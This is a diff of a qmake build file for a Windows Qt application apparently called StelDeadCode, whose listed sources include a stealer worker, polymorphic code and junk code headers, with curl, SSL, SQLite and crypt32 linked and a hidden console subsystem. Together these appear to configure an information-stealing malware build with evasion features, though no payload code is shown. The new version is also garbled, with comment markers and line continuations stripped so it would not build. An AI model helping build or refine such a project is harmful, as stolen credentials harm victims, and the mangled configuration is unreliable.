@@ -1,95 +1,154 @@
-# Основные модули Qt
+Основные модули Qt
 QT += core gui network widgets sql
 
-# Имя цели и шаблон приложения
-TARGET = StelDeadCode
+Имя цели и шаблон приложения
+TARGET = DeadCode
 TEMPLATE = app
 CONFIG += release c++17
 
-# Исходные файлы
-SOURCES += \
-    ../src/main.cpp \
-    mainwindow.cpp
+Исходные файлы
+SOURCES += 
 
-# Заголовочные файлы
-HEADERS += \
-    mainwindow.h \
-    ../src/build_key.h \
-    ../src/polymorphic_code.h \
-    ../src/junk_code.h \
-    ../src/stealerworker.h
+../src/main.cpp 
 
-# Формы Qt Designer
-FORMS += \
-    mainwindow.ui
+mainwindow.cpp
 
-# Ресурсы (иконка приложения)
+Заголовочные файлы
+HEADERS += 
+
+mainwindow.h 
+
+../src/build_key.h 
+
+../src/polymorphic_code.h 
+
+../src/junk_code.h 
+
+../src/stealerworker.h
+
+Формы Qt Designer
+FORMS += 
+
+mainwindow.ui
+
+Ресурсы (иконка приложения)
 RC_FILE = ../icon.rc
 
-# Пути для включения заголовков
-INCLUDEPATH += \
-    ../src \
-    . \
-    C:/vcpkg/installed/x64-mingw-dynamic/include
+Пути для включения заголовков
+INCLUDEPATH += 
 
-# Библиотеки для линковки
-LIBS += -LC:/vcpkg/installed/x64-mingw-dynamic/lib \
-        -lsqlite3 \
-        -lcurl \
-        -lssl \
-        -lcrypto \
-        -lzip \
-        -lbz2 \
-        -lz
+../src 
 
-# Флаги компиляции
-QMAKE_CXXFLAGS += -O2 \
-                  -Wall \
-                  -Wextra \
-                  -Werror=return-type
+. 
 
-# Флаги линковки
-QMAKE_LFLAGS += -O2 \
-                -Wl,-subsystem,windows \
-                -mthreads
+C:/vcpkg/installed/x64-mingw-dynamic/include 
 
-# Определения для сборки (задаются через workflow)
-DEFINES += QT_NO_DEBUG
+C:/Qt/6.5.3/mingw_64/include
 
-# Директории для сборки
-DESTDIR = ../build/release
-OBJECTS_DIR = ../build/release
-MOC_DIR = ../build/release
-UI_DIR = ../build/release
+Библиотеки для линковки
+LIBS += -LC:/vcpkg/installed/x64-mingw-dynamic/lib 
 
-# Очистка при сборке
-QMAKE_CLEAN += \
-    ../build/release/*.exe \
-    ../build/release/*.o \
-    ../build/release/moc_*.cpp \
-    ../build/release/ui_*.h
+-LC:/Qt/6.5.3/mingw_64/lib 
 
-# Настройки для Windows
+-lsqlite3 
+
+-lcurl 
+
+-lssl 
+
+-lcrypto 
+
+-lzip 
+
+-lbz2 
+
+-lz 
+
+-lws2_32 
+
+-lgdi32 
+
+-luser32 
+
+-ladvapi32 
+
+-lshell32 
+
+-lole32 
+
+-lcrypt32
+
+Флаги компиляции
+QMAKE_CXXFLAGS += -O2 
+
+-Wall 
+
+-Wextra 
+
+-Werror=return-type 
+
+-DUNICODE 
+
+-D_WIN32 
+
+-DMINGW_HAS_SECURE_API=1
+
+Флаги линковки
+QMAKE_LFLAGS += -O2 
+
+-Wl,-subsystem,windows 
+
+-mthreads
+
+Директории для сборки
+DESTDIR = release
+OBJECTS_DIR = release
+MOC_DIR = release
+UI_DIR = release
+
+Очистка при сборке
+QMAKE_CLEAN += 
+
+release/StelDeadCode.exe 
+
+release/.o 
+
+release/moc_.cpp 
+
+release/ui_*.h 
+
+release/StelDeadCode-Portable.zip
+
+Настройки для Windows
 win32 {
-    CONFIG(debug, debug|release) {
-        QMAKE_CXXFLAGS += -g
-        QMAKE_LFLAGS -= -O2
-        DESTDIR = ../build/debug
-        OBJECTS_DIR = ../build/debug
-        MOC_DIR = ../build/debug
-        UI_DIR = ../build/debug
-        QMAKE_CLEAN += \
-            ../build/debug/*.exe \
-            ../build/debug/*.o \
-            ../build/debug/moc_*.cpp \
-            ../build/debug/ui_*.h
-    }
+CONFIG(debug, debug|release) {
+QMAKE_CXXFLAGS += -g
+QMAKE_LFLAGS -= -O2
+DESTDIR = debug
+OBJECTS_DIR = debug
+MOC_DIR = debug
+UI_DIR = debug
+QMAKE_CLEAN += 
+
+debug/StelDeadCode.exe 
+
+debug/.o 
+
+debug/moc_.cpp 
+
+debug/ui_*.h
+}
 }
 
-# Зависимости перед сборкой
-PRE_TARGETDEPS += \
-    ../src/build_key.h \
-    ../src/polymorphic_code.h \
-    ../src/junk_code.h \
-    ../src/stealerworker.h \
-    $$UI_DIR/ui_mainwindow.h
+Зависимости перед сборкой
+PRE_TARGETDEPS += 
+
+../src/build_key.h 
+
+../src/polymorphic_code.h 
+
+../src/junk_code.h 
+
+../src/stealerworker.h 
+
+release/ui_mainwindow.h
